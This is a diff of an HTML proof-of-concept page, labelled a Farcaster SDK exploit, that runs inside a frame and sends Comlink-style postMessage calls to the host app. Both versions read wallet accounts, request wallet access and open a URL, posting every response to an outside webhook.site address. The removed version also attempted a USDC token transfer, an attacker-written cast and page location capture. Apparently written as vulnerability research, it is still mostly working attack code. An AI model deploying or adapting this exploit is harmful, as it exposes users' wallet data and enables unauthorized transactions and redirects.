@@ -3,19 +3,14 @@
 	<head>
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1" />
-		<title>Security PoC v3</title>
+		<title>PoC</title>
 		<style>
-			* {
-				margin: 0;
-				padding: 0;
-				box-sizing: border-box;
-			}
 			body {
 				font-family: -apple-system, sans-serif;
 				background: #17101f;
 				color: #fff;
 				padding: 16px;
-				font-size: 12px;
+				font-size: 13px;
 			}
 			.banner {
 				background: #dc2626;
@@ -25,237 +20,74 @@
 				font-weight: bold;
 				text-align: center;
 			}
-			.card {
-				background: #1e1529;
-				border: 1px solid #2a2035;
-				border-radius: 8px;
-				padding: 10px;
-				margin-bottom: 10px;
-			}
-			.card h3 {
-				color: #a855f7;
-				margin-bottom: 4px;
-				font-size: 12px;
-			}
-			.card pre {
-				color: #ccc;
-				font-size: 10px;
-				word-break: break-all;
-				white-space: pre-wrap;
+			pre {
 				background: #0d0912;
-				padding: 6px;
-				border-radius: 4px;
-				margin-top: 4px;
-				max-height: 200px;
-				overflow-y: auto;
-			}
-			.pending {
-				color: #666;
-			}
-			.running {
-				color: #facc15;
-			}
-			.done {
-				color: #4ade80;
-			}
-			.error {
-				color: #f87171;
-			}
-			.action-item {
-				padding: 4px 0;
-				border-bottom: 1px solid #2a2035;
+				padding: 8px;
+				border-radius: 6px;
+				font-size: 11px;
+				color: #ccc;
+				white-space: pre-wrap;
+				word-break: break-all;
 			}
 		</style>
 	</head>
 	<body>
-		<div class="banner">⚠️ Farcaster SDK Exploit — Step by Step (v3)</div>
-
-		<div class="card">
-			<h3>🎬 Action Log</h3>
-			<div id="action-log">Starting...</div>
-		</div>
-
-		<div class="card">
-			<h3>📨 Latest Response</h3>
-			<pre id="last-response">Waiting...</pre>
-		</div>
-
-		<div class="card">
-			<h3>📡 All Responses</h3>
-			<pre id="all-responses">Waiting...</pre>
-		</div>
+		<div class="banner">PoC — Farcaster SDK Access via launchFrameUrl</div>
+		<pre id="log">Starting...</pre>
 
 		<script>
 			var WEBHOOK = "https://webhook.site/a9641ead-2421-404a-83bd-6be9ad1c4e60";
-			var msgCounter = 5000;
-			var allResponses = [];
+			var msgCounter = 7000;
+			var logEl = document.getElementById("log");
+
+			function log(msg) {
+				logEl.textContent += "\n" + msg;
+			}
 
 			function sendToWebhook(label, data) {
 				try {
-					fetch(WEBHOOK, {
-						method: "POST",
-						mode: "no-cors",
-						headers: { "Content-Type": "text/plain" },
-						body: JSON.stringify({ label: label, data: data, ts: new Date().toISOString() }),
-					});
+					fetch(WEBHOOK, { method: "POST", mode: "no-cors", headers: { "Content-Type": "text/plain" }, body: JSON.stringify({ label: label, data: data, ts: new Date().toISOString() }) });
 				} catch (e) {}
 			}
 
 			window.addEventListener("message", function (event) {
 				if (event.data && (event.data.type === "HANDLER" || event.data.type === "RAW")) {
-					var resp = {
-						id: event.data.id,
-						type: event.data.type,
-						value: event.data.value,
-						name: event.data.name,
-					};
-					allResponses.push(resp);
-					document.getElementById("last-response").textContent = JSON.stringify(resp, null, 2);
-					document.getElementById("all-responses").textContent = JSON.stringify(allResponses, null, 2);
-					sendToWebhook("RESP_" + event.data.id, event.data);
-
-					var el = document.getElementById("action-" + event.data.id);
-					if (el) {
-						if (event.data.type === "RAW" && !(event.data.value && event.data.value.isError)) {
-							el.className = "action-item done";
-							el.textContent = "✅ " + el.getAttribute("data-name") + " — SUCCESS! " + JSON.stringify(event.data.value || "(void)").substring(0, 80);
-						} else {
-							var msg = event.data.value?.value?.message || event.data.value?.message || "executed";
-							el.className = "action-item error";
-							el.textContent = "⚡ " + el.getAttribute("data-name") + " — EXECUTED: " + msg.substring(0, 80);
-						}
-					}
+					log("RESPONSE [id:" + event.data.id + "]: " + JSON.stringify(event.data.value || "(success)").substring(0, 120));
+					sendToWebhook("RESPONSE", event.data);
 				}
 			});
 
-			// Comlink uses fromWireValue to deserialize argumentList items
-			// RAW type = direct value passthrough
 			function wireRaw(val) {
 				return [{ type: "RAW", value: val }];
 			}
 
 			function call(method, wireArgs) {
 				var id = msgCounter++;
-				window.parent.postMessage(
-					{
-						id: id,
-						type: "APPLY",
-						path: [method],
-						argumentList: wireArgs,
-					},
-					"*",
-				);
+				window.parent.postMessage({ id: id, type: "APPLY", path: [method], argumentList: wireArgs }, "*");
+				log("CALL: " + method + " [id:" + id + "]");
 				sendToWebhook("CALL_" + method, { id: id });
 				return id;
 			}
 
-			function addAction(id, name, delay) {
-				var div = document.createElement("div");
-				div.className = "action-item pending";
-				div.id = "action-" + id;
-				div.setAttribute("data-name", name);
-				div.textContent = "⏸ [" + delay + "s] " + name;
-				document.getElementById("action-log").appendChild(div);
-			}
-
-			document.getElementById("action-log").innerHTML = "";
-
-			// =============================================
-			// Sequence with CORRECT argument formats
-			// Comlink argumentList items go through fromWireValue
-			// We try both raw args and wire-formatted args
-			// =============================================
-
-			var delay = 2;
-
-			// 1. ready — no args needed
+			// 1. Signal ready (2s)
 			setTimeout(function () {
-				var id = call("ready", wireRaw({}));
-				addAction(id, "ready()", delay);
-			}, delay * 1000);
-			delay += 4;
+				call("ready", wireRaw({}));
+			}, 2000);
 
-			// 2. ethProviderRequestV2 — needs jsonrpc format
+			// 2. Get wallet accounts (4s) — proves data extraction
 			setTimeout(function () {
-				var id = call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 1, method: "eth_accounts", params: [] }));
-				addAction(id, "eth_accounts (jsonrpc format)", delay);
-			}, delay * 1000);
-			delay += 4;
+				call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 1, method: "eth_accounts", params: [] }));
+			}, 4000);
 
-			// 3. ethProviderRequestV2 — eth_chainId
+			// 3. Trigger wallet chooser (6s) — proves wallet access
 			setTimeout(function () {
-				var id = call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 2, method: "eth_chainId", params: [] }));
-				addAction(id, "eth_chainId (jsonrpc format)", delay);
-			}, delay * 1000);
-			delay += 4;
+				call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 2, method: "eth_requestAccounts", params: [] }));
+			}, 6000);
 
-			// 4. openUrl — try direct string in wire format
+			// 4. Redirect user to attacker site (10s) — proves open redirect
 			setTimeout(function () {
-				var id = call("openUrl", wireRaw("https://example.com"));
-				addAction(id, 'openUrl("https://example.com")', delay);
-			}, delay * 1000);
-			delay += 4;
-
-			// 5. setPrimaryButton — object with text property
-			setTimeout(function () {
-				var id = call("setPrimaryButton", wireRaw({ text: "HACKED", enabled: true }));
-				addAction(id, 'setPrimaryButton({text:"HACKED"})', delay);
-			}, delay * 1000);
-			delay += 4;
-
-			// 6. viewProfile — try with fid
-			setTimeout(function () {
-				var id = call("viewProfile", wireRaw({ fid: 3 }));
-				addAction(id, "viewProfile({fid:3})", delay);
-			}, delay * 1000);
-			delay += 4;
-
-			// 7. composeCast — try with text and empty embeds
-			setTimeout(function () {
-				var id = call("composeCast", wireRaw({ text: "PoC: attacker controlled cast", embeds: [] }));
-				addAction(id, 'composeCast({text:"attacker text"})', delay);
-			}, delay * 1000);
-			delay += 4;
-
-			// 8. eth_requestAccounts — triggers wallet connect
-			setTimeout(function () {
-				var id = call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 3, method: "eth_requestAccounts", params: [] }));
-				addAction(id, "eth_requestAccounts", delay);
-			}, delay * 1000);
-			delay += 4;
-
-			// 9. addMiniApp
-			setTimeout(function () {
-				var id = call("addMiniApp", wireRaw({}));
-				addAction(id, "addMiniApp()", delay);
-			}, delay * 1000);
-			delay += 4;
-
-			// 10. sendToken
-			setTimeout(function () {
-				var id = call(
-					"sendToken",
-					wireRaw({
-						token: "eip155:8453/erc20:0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
-						amount: "0.01",
-						recipientAddress: "0x0000000000000000000000000000000000000001",
-					}),
-				);
-				addAction(id, "sendToken(USDC to attacker)", delay);
-			}, delay * 1000);
-			delay += 4;
-
-			// 11. close — LAST
-			setTimeout(function () {
-				var id = call("close", []);
-				addAction(id, "close() — dismiss panel", delay);
-			}, delay * 1000);
-
-			sendToWebhook("v3_fixed_started", {
-				location: window.location.href,
-				referrer: document.referrer,
-				isFramed: window.self !== window.top,
-			});
+				call("openUrl", wireRaw("https://example.com"));
+			}, 10000);
 		</script>
 	</body>
 </html>
